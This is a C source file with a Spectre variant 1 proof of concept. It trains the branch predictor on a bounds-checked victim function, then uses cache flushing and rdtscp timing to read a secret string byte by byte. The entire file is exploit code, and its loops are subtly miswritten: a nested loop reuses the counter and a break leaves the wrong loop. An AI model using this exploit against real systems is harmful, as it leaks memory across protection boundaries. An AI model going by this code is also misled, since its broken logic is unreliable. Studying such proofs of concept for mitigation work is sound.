#include<stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MS_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
//#include <x86intrin.h>
#endif


unsigned int array1_size = 16;
uint8_t unused[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*512];

char *secret= "The Magic Words are Squeamish Ossifrage";

uint8_t temp =0;

void victim_function(size_t x){
    if(x<array1_size){
        temp &= array2[array1[x]*512];
    }
}




#define CACHE_HIT_THRESHOLD (80)

void readMemoryByte(size_t malicious_x,uint8_t value[2],int score[2]){
    static int result[256];
    int tries, i,j,k,mix_i,junk = 0;
    size_t training_x,x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;


    for(i = 0; i<256;i++)
    result[i]=0;
    for(tries = 999; tries>0;tries--){
        for(i = 0;i < 256;i++)
        _mm_clflush(&array2[i*512]);

        training_x = tries % array1_size;
        for(j=29;j>=0;j--){
            _mm_clflush(&array1_size);
            for(volatile int z = 0; z<100;z++){}

            x= ((j%6)-1) & 0xFFFF;
            x = (x|(x>>16));
            x= training_x ^ (x &(malicious_x ^ training_x));

            victim_function(x);

        }


        for(i = 0; i <256;i++){
            mix_i = ((i*167)+13) &255;
            addr = &array2[mix_i *512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            
            if(time2 <= CACHE_HIT_THRESHOLD &&mix_i != array1[tries % array1_size])
            result[mix_i]++;
            
            j = k = -1;
            for(i = 0;i<256;i++){
                if(j <0  || result[i]>= result[j]){
                    k=j;
                    j=i;
                }
                else if (k<0 || result[i] >= result[k]){
                    k =i;
                }
            }       
            if(result[j]>= (2*result[k]+5)|| (result[j]==2 && result[k]==0))
            break;
            }

            result[0] ^= junk;
            value[0] = (uint8_t)j;
            score[0] = result[j];
            value[1] = (uint8_t)k;
            score[1] = result[k];

        
    }
}
 int main(int argc, const char **argv) {
      size_t malicious_x=(size_t)(secret-(char*)array1); 
      /* default for malicious_x */ 
      int i, score[2], len=40; uint8_t value[2];
      
       for (i = 0; i < sizeof(array2); i++) 
        array2[i] = 1; 
        /* write to array2 so in RAM not copy-on-write zero pages */ 
         if (argc == 3) { 
              sscanf_s(argv[1], "%p", (void**)(&malicious_x)); 
               malicious_x -= (size_t)array1; 
               /* Convert input value into a pointer */ 
                sscanf_s(argv[2], "%d", &len);  } 
                 printf("Reading %d bytes:\n", len);
                  while (--len >= 0) { 
                       printf("Reading at malicious_x = %p... ", (void*)malicious_x); 
                       readMemoryByte(malicious_x++, value, score); 
                        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear")); 
                         printf("0x%02X=’%c’ score=%d ", value[0], 
                          (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); 
                           if (score[1] > 0) 
                            printf("(second best: 0x%02X score=%d)", value[1], score[1]); 
                             printf("\n"); }  return (0);
                              }

                              
                               
